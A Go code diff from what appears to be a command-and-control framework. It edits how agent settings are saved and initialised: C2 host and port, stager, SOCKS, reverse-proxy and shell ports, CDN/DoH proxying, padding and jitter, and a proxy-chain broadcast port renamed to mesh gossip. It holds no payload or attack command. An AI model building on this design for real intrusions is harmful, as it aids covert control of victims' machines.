@@ -20,50 +20,48 @@ import (
 func SaveConfigJSON() (err error) {
 	// Create a map to hold the config values with snake_case keys
 	configMap := map[string]interface{}{
-		"cc_address":                         live.RuntimeConfig.CCAddress,
-		"cc_host":                            live.RuntimeConfig.CCHost,
-		"cc_port":                            live.RuntimeConfig.CCPort,
-		"agent_socks_server_port":            live.RuntimeConfig.AgentSocksServerPort,
-		"agent_socks_timeout":                live.RuntimeConfig.AgentSocksTimeout,
-		"stager_http_listener_port":          live.RuntimeConfig.StagerHTTPListenerPort,
-		"password":                           live.RuntimeConfig.Password,
-		"shadowsocks_local_socks_port":       live.RuntimeConfig.ShadowsocksLocalSocksPort,
-		"shadowsocks_server_port":            live.RuntimeConfig.ShadowsocksServerPort,
-		"kcp_server_port":                    live.RuntimeConfig.KCPServerPort,
-		"kcp_client_port":                    live.RuntimeConfig.KCPClientPort,
-		"use_kcp":                            live.RuntimeConfig.UseKCP,
-		"enable_ncsi":                        live.RuntimeConfig.EnableNCSI,
-		"ssh_host_key":                       string(live.RuntimeConfig.SSHHostKey),
-		"bring2cc_reverse_proxy_port":        live.RuntimeConfig.Bring2CCReverseProxyPort,
-		"sshd_shell_port":                    live.RuntimeConfig.SSHDShellPort,
-		"proxy_chain_broadcast_port":         live.RuntimeConfig.ProxyChainBroadcastPort,
-		"proxy_chain_broadcast_interval_min": live.RuntimeConfig.ProxyChainBroadcastIntervalMin,
-		"proxy_chain_broadcast_interval_max": live.RuntimeConfig.ProxyChainBroadcastIntervalMax,
-		"preflight_enabled":                  live.RuntimeConfig.PreflightEnabled,
-		"preflight_url":                      live.RuntimeConfig.PreflightURL,
-		"preflight_method":                   live.RuntimeConfig.PreflightMethod,
-		"preflight_headers":                  live.RuntimeConfig.PreflightHeaders,
-		"ca_pem":                             live.RuntimeConfig.CAPEM,
-		"ca_fingerprint":                     live.RuntimeConfig.CAFingerprint,
-		"c2_transport_proxy":                 live.RuntimeConfig.C2TransportProxy,
-		"cdn_proxy":                          live.RuntimeConfig.CDNProxy,
-		"doh_server":                         live.RuntimeConfig.DoHServer,
-		"agent_uuid":                         live.RuntimeConfig.AgentUUID,
-		"agent_uuid_sig":                     live.RuntimeConfig.AgentUUIDSig,
-		"agent_tag":                          live.RuntimeConfig.AgentTag,
-		"cc_timeout":                         live.RuntimeConfig.CCTimeout,
-		"c2_prefix":                          live.RuntimeConfig.C2Prefix,
-		"checkin_path":                       live.RuntimeConfig.CheckInPath,
-		"msg_path":                           live.RuntimeConfig.MsgPath,
-		"ftp_path":                           live.RuntimeConfig.FTPPath,
-		"www_path":                           live.RuntimeConfig.WWWPath,
-		"proxy_path":                         live.RuntimeConfig.ProxyPath,
-		"user_agent":                         live.RuntimeConfig.UserAgent,
-		"c2_headers":                         live.RuntimeConfig.C2Headers,
-		"padding_min":                        live.RuntimeConfig.PaddingMin,
-		"padding_max":                        live.RuntimeConfig.PaddingMax,
-		"jitter":                             live.RuntimeConfig.Jitter,
-		"is_run_by_stager":                   live.RuntimeConfig.IsRunByStager,
+		"cc_address":                   live.RuntimeConfig.CCAddress,
+		"cc_host":                      live.RuntimeConfig.CCHost,
+		"cc_port":                      live.RuntimeConfig.CCPort,
+		"agent_socks_server_port":      live.RuntimeConfig.AgentSocksServerPort,
+		"agent_socks_timeout":          live.RuntimeConfig.AgentSocksTimeout,
+		"stager_http_listener_port":    live.RuntimeConfig.StagerHTTPListenerPort,
+		"password":                     live.RuntimeConfig.Password,
+		"shadowsocks_local_socks_port": live.RuntimeConfig.ShadowsocksLocalSocksPort,
+		"shadowsocks_server_port":      live.RuntimeConfig.ShadowsocksServerPort,
+		"kcp_server_port":              live.RuntimeConfig.KCPServerPort,
+		"kcp_client_port":              live.RuntimeConfig.KCPClientPort,
+		"use_kcp":                      live.RuntimeConfig.UseKCP,
+		"enable_ncsi":                  live.RuntimeConfig.EnableNCSI,
+		"ssh_host_key":                 string(live.RuntimeConfig.SSHHostKey),
+		"bring2cc_reverse_proxy_port":  live.RuntimeConfig.Bring2CCReverseProxyPort,
+		"sshd_shell_port":              live.RuntimeConfig.SSHDShellPort,
+		"mesh_gossip_port":             live.RuntimeConfig.MeshGossipPort,
+		"preflight_enabled":            live.RuntimeConfig.PreflightEnabled,
+		"preflight_url":                live.RuntimeConfig.PreflightURL,
+		"preflight_method":             live.RuntimeConfig.PreflightMethod,
+		"preflight_headers":            live.RuntimeConfig.PreflightHeaders,
+		"ca_pem":                       live.RuntimeConfig.CAPEM,
+		"ca_fingerprint":               live.RuntimeConfig.CAFingerprint,
+		"c2_transport_proxy":           live.RuntimeConfig.C2TransportProxy,
+		"cdn_proxy":                    live.RuntimeConfig.CDNProxy,
+		"doh_server":                   live.RuntimeConfig.DoHServer,
+		"agent_uuid":                   live.RuntimeConfig.AgentUUID,
+		"agent_uuid_sig":               live.RuntimeConfig.AgentUUIDSig,
+		"agent_tag":                    live.RuntimeConfig.AgentTag,
+		"cc_timeout":                   live.RuntimeConfig.CCTimeout,
+		"c2_prefix":                    live.RuntimeConfig.C2Prefix,
+		"checkin_path":                 live.RuntimeConfig.CheckInPath,
+		"msg_path":                     live.RuntimeConfig.MsgPath,
+		"ftp_path":                     live.RuntimeConfig.FTPPath,
+		"www_path":                     live.RuntimeConfig.WWWPath,
+		"proxy_path":                   live.RuntimeConfig.ProxyPath,
+		"user_agent":                   live.RuntimeConfig.UserAgent,
+		"c2_headers":                   live.RuntimeConfig.C2Headers,
+		"padding_min":                  live.RuntimeConfig.PaddingMin,
+		"padding_max":                  live.RuntimeConfig.PaddingMax,
+		"jitter":                       live.RuntimeConfig.Jitter,
+		"is_run_by_stager":             live.RuntimeConfig.IsRunByStager,
 	}
 
 	w_data, err := json.MarshalIndent(configMap, "", "  ")
@@ -81,7 +79,7 @@ func InitConfigFile(cc_host string) (err error) {
 	live.RuntimeConfig.CCHost = cc_host
 	live.RuntimeConfig.CCPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
 	live.RuntimeConfig.AgentSocksServerPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
-	live.RuntimeConfig.ProxyChainBroadcastPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
+	live.RuntimeConfig.MeshGossipPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
 	live.RuntimeConfig.SSHDShellPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
 	live.RuntimeConfig.ShadowsocksLocalSocksPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
 	live.RuntimeConfig.ShadowsocksServerPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
@@ -100,8 +98,7 @@ func InitConfigFile(cc_host string) (err error) {
 	live.RuntimeConfig.Password = util.RandStr(20)
 
 	// time intervals
-	live.RuntimeConfig.ProxyChainBroadcastIntervalMin = 30
-	live.RuntimeConfig.ProxyChainBroadcastIntervalMax = 130
+
 	// Preflight default
 	live.RuntimeConfig.PreflightEnabled = true
 	if live.RuntimeConfig.PreflightURL == "" {
